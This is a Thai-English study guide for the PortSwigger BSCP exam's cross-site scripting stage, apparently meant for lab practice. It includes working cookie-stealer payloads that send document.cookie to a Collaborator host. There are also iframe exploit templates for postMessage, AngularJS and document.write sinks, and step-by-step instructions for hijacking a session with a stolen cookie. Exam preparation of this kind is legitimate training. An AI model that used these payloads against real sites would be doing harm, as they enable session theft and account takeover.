# BSCP Exam Workflow - XSS
> [Back to Index](README.md)

---

## Exam Overview

| รายละเอียด | ข้อมูล |
|------------|--------|
| **เวลาทั้งหมด** | 4 ชั่วโมง |
| **จำนวนแอป** | 2 แอป (แอปละ 2 ชั่วโมง) |
| **เป้าหมาย** | อ่าน `/home/carlos/secret` |
| **Stages** | 3 stages ต่อแอป |

---

## Stage 1: Foothold (XSS → User Cookie)

### Step 1: Recon (5-10 นาที)

```
1. Browse ทั้งแอป → สร้าง sitemap
2. เปิด DevTools → ดู source code
3. หา:
   □ Search function
   □ Comment/feedback form
   □ URL parameters ที่ reflect
   □ AngularJS (ng-app, angular.js)
   □ postMessage listeners
```

### Step 2: Check Cookie Flags

```
DevTools → Application → Cookies

□ HttpOnly = false? → Cookie Stealer ได้!
□ HttpOnly = true?  → Credential Harvesting
```

### Step 3: Identify XSS Type

| สิ่งที่เจอ | ทดสอบ | Pattern |
|-----------|-------|---------|
| Search box | `{{7*7}}` | AngularJS |
| URL param reflect | `"><script>` | Reflected |
| postMessage listener | DOM Invader | Pattern 3-5 |
| document.write | `">` | Pattern 2 |
| jQuery + hash | `#<img>` | Pattern 8 |

### Step 4: Create Payload

```javascript
// Cookie Stealer
fetch('https://COLLABORATOR/?c='+document.cookie)

// หรือ
document.location='https://COLLABORATOR/?c='+document.cookie
```

### Step 5: Host on Exploit Server

```html
<iframe src="https://TARGET.net/vulnerable-page?payload=..."
        onload="...">
</iframe>
```

### Step 6: Deliver & Capture

```
1. Exploit Server → Store
2. Deliver exploit to victim
3. Burp Collaborator → Poll now
4. Copy victim's cookie
5. DevTools → Application → Cookies → Replace
6. Refresh → เข้าเป็น victim!
```

---

## Quick Identification Flow

```
┌──────────────────────────────────────────────────────────┐
│                    XSS IDENTIFICATION                     │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  มี ng-app + angular.js?                                 │
│      YES → ทดสอบ {{7*7}}                                 │
│             ถ้าได้ 49 → AngularJS XSS (Pattern 1)        │
│                                                          │
│  มี search/input ที่ reflect?                            │
│      YES → ทดสอบ "><script>alert(1)</script>            │
│             ถ้า alert → Reflected XSS                    │
│                                                          │
│  มี document.write ใน code?                              │
│      YES → ทดสอบ "> escape                               │
│             ถ้า escape ได้ → Pattern 2                   │
│                                                          │
│  มี addEventListener('message')?                         │
│      YES → ใช้ DOM Invader                               │
│           - มี JSON.parse? → Pattern 3                   │
│           - มี indexOf check? → Pattern 4               │
│           - มี innerHTML? → Pattern 5                   │
│                                                          │
│  มี jQuery + hashchange?                                 │
│      YES → Pattern 8                                     │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

## Time Management

| Task | เวลา |
|------|------|
| Recon + Sitemap | 5-10 นาที |
| Identify vulnerability | 10-15 นาที |
| Create payload | 5-10 นาที |
| Test + Debug | 10-15 นาที |
| Deliver + Capture | 5 นาที |
| **Total Stage 1** | **35-55 นาที** |

**ถ้าติดอยู่ > 20 นาที → move on หาช่องโหว่อื่น**

---

## Common Mistakes

```
❌ Full scan ทั้งแอป (เสียเวลา)
   → ✅ Targeted scan เฉพาะ parameters

❌ ลืมเช็ค HttpOnly
   → ✅ เช็ค cookie flags ก่อนทำ payload

❌ ไม่ URL encode
   → ✅ Encode payload ใน URL

❌ ใช้ <script> ใน innerHTML
   → ✅ ใช้ event handlers แทน

❌ ติดอยู่กับช่องโหว่เดียวนาน
   → ✅ 20 นาที max แล้ว move on
```

---

## DOM Invader Workflow

```
1. Burp → Proxy → Open browser
2. DevTools → DOM Invader tab
3. Enable:
   □ DOM Invader: ON
   □ Canary: "domxss"
   □ Postmessage interception: ON
4. Browse แอป
5. ดูผล:
   - Sources พบ
   - Sinks ที่ถูก hit
   - postMessages
6. Test payloads via Replay
```

---

## Payload Templates

### AngularJS

```html
<script>
location = "https://TARGET.net/?search={{$on.constructor('document.location=\"https://COLLAB?c=\"%2bdocument.cookie')()}}";
</script>
```

### postMessage (JSON)

```html
<iframe src="https://TARGET.net/"
        onload='this.contentWindow.postMessage(JSON.stringify({
          type:"load-channel",
          url:"javascript:fetch(`https://COLLAB/?c=`+document.cookie)"
        }),"*")'>
</iframe>
```

### postMessage (JavaScript URL)

```html
<iframe src="https://TARGET.net/"
        onload="this.contentWindow.postMessage(
          'javascript:document.location=`https://COLLAB?c=`+document.cookie',
          '*')">
</iframe>
```

### document.write

```html
<iframe src="https://TARGET.net/page?param=%22%3E%3Cscript%3Edocument.location='https://COLLAB/?c='%2bdocument.cookie%3C/script%3E">
</iframe>
```

---

## Checklist Before Deliver

```
┌────────────────────────────────────────────────────────┐
│              PRE-DELIVERY CHECKLIST                     │
├────────────────────────────────────────────────────────┤
│                                                        │
│  □ Cookie flags เช็คแล้ว (HttpOnly = false)           │
│  □ Payload test ใน browser แล้ว (alert works)         │
│  □ Collaborator URL ถูกต้อง                           │
│  □ URL encoding ถูกต้อง                               │
│  □ Exploit Server → Store แล้ว                        │
│  □ "View exploit" ทดสอบตัวเองก่อน                     │
│                                                        │
└────────────────────────────────────────────────────────┘
```

---

## After Getting Cookie

```
1. Copy session cookie จาก Collaborator
2. DevTools → Application → Cookies → TARGET
3. แก้ไข session cookie value
4. Refresh page
5. ตรวจสอบว่า login เป็น victim แล้ว
6. ดำเนินการ Stage 2!
```

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────┐
│                    XSS QUICK REF                         │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Test strings:                                          │
│  <>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer  │
│                                                         │
│  Cookie stealer:                                        │
│  fetch('https://COLLAB/?c='+document.cookie)           │
│                                                         │
│  Event handlers (innerHTML):                            │
│  <img src=x onerror=...>                               │
│  <svg onload=...>                                       │
│                                                         │
│  AngularJS:                                             │
│  {{$on.constructor('...')()}}                          │
│                                                         │
│  Encoding: %22=" %3C=< %3E=> %2B=+                     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

> **Resources:**
> - [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
> - [DOM Invader Docs](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
